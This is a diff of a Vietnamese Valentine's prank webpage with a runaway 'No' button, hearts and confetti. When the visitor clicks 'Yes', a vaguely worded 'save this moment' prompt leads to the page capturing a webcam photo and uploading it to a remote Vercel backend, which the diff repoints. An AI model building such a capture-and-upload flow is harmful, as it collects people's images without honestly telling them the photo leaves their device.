@@ -19,7 +19,7 @@ button { padding:12px 25px; margin:10px; border:none; border-radius:10px; font-s
 <div class="container">
   <h1 id="text">Cậu sẽ là Valentine của tớ chứ? 💌</h1>
   <div id="gifContainer">
-    <img id="mainGif" src="https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/giphy.gif" width="250">
+    <img id="mainGif" src="https://media.giphy.com/media/3o6Zt481isNVuQI1l6/giphy.gif" width="300">
   </div>
   <button id="yesBtn">Đồng ý 💖</button>
   <button id="noBtn">Từ chối 😢</button>
@@ -27,21 +27,28 @@ button { padding:12px 25px; margin:10px; border:none; border-radius:10px; font-s
 <audio id="music" loop>
   <source src="https://www.fesliyanstudios.com/play-mp3/387" type="audio/mpeg">
 </audio>
+<audio id="clickSound">
+  <source src="https://www.soundjay.com/button/sounds/button-16.mp3" type="audio/mpeg">
+</audio>
 <script>
 const yesBtn=document.getElementById("yesBtn");
 const noBtn=document.getElementById("noBtn");
 const text=document.getElementById("text");
 const music=document.getElementById("music");
+const clickSound=document.getElementById("clickSound");
 const mainGif=document.getElementById("mainGif");
+
 let scale=1;
 let cameraAsked=false;
+let noHoverCount=0;
 
 // Bấm anywhere để bật nhạc
 document.body.onclick=()=>{music.play();};
 
-// Troll nút từ chối
+// Nút từ chối hover logic
 const noTexts=["Thật không? 😢","Suy nghĩ lại đi 🥺","Đừng mà 😭","Bấm nhầm đúng không 😏","Cho cơ hội đi 💔"];
 noBtn.onmouseover=()=>{
+  if(noHoverCount>=6){ noBtn.style.display="none"; return; }
   const x=Math.random()*(window.innerWidth-100);
   const y=Math.random()*(window.innerHeight-50);
   noBtn.style.left=x+"px";
@@ -49,14 +56,16 @@ noBtn.onmouseover=()=>{
   scale=Math.max(0.5, scale-0.1);
   noBtn.style.transform=`scale(${scale})`;
   noBtn.innerText=noTexts[Math.floor(Math.random()*noTexts.length)];
+  noHoverCount++;
 };
 
-// Xử lý khi bấm Đồng ý
+// Bấm Đồng ý
 yesBtn.onclick = handleYes;
 
 async function handleYes(){
-  if(cameraAsked) return; // chỉ hỏi 1 lần
+  if(cameraAsked) return;
   cameraAsked = true;
+  clickSound.play();
   const allow = confirm("Cho tớ lưu lại khoảnh khắc này nhé? 📸");
   if(allow){
     try{
@@ -72,7 +81,7 @@ async function handleYes(){
   yesAction();
 }
 
-// Start camera
+// Bật camera
 async function startCamera(){
   const video=document.createElement("video");
   video.autoplay=true;
@@ -86,7 +95,7 @@ async function startCamera(){
   window.currentVideo=video;
 }
 
-// Chụp ảnh từ video
+// Chụp ảnh
 function captureImage(){
   const canvas=document.createElement("canvas");
   const video=window.currentVideo;
@@ -97,10 +106,10 @@ function captureImage(){
   return canvas.toDataURL("image/png");
 }
 
-// Gửi ảnh lên backend
+// Gửi ảnh backend
 async function sendImage(){
   const img=captureImage();
-  await fetch("https://duong-stack-valentine-telegram-back-omega.vercel.app/upload",{
+  await fetch("https://duong-stack-valentine-telegram-back-puce.vercel.app/upload",{
     method:"POST",
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify({image:img})
@@ -111,14 +120,14 @@ async function sendImage(){
 function yesAction(){
   text.innerHTML="Tớ biết mà 😍💖 Yêu cậu!!!";
   yesBtn.style.display="none";
-  noBtn.style.display="inline-block"; // vẫn hiển thị nhưng đè lên GIF
-  mainGif.src="https://media.giphy.com/media/MDJ9IbxxvDUQM/giphy.gif"; // GIF mèo
-  mainGif.width=350; // GIF to hơn
+  noBtn.style.display="inline-block"; 
+  mainGif.src="https://media.giphy.com/media/MDJ9IbxxvDUQM/giphy.gif";
+  mainGif.width=400;
   setInterval(createHeart,200);
   createConfetti();
 }
 
-// Tim bay lên
+// Tim bay
 function createHeart(){
   const heart=document.createElement("div");
   heart.classList.add("heart");
@@ -129,7 +138,7 @@ function createHeart(){
   setTimeout(()=>heart.remove(),4000);
 }
 
-// Mưa confetti
+// Confetti
 function createConfetti(){
   for(let i=0;i<100;i++){
     const conf=document.createElement("div");
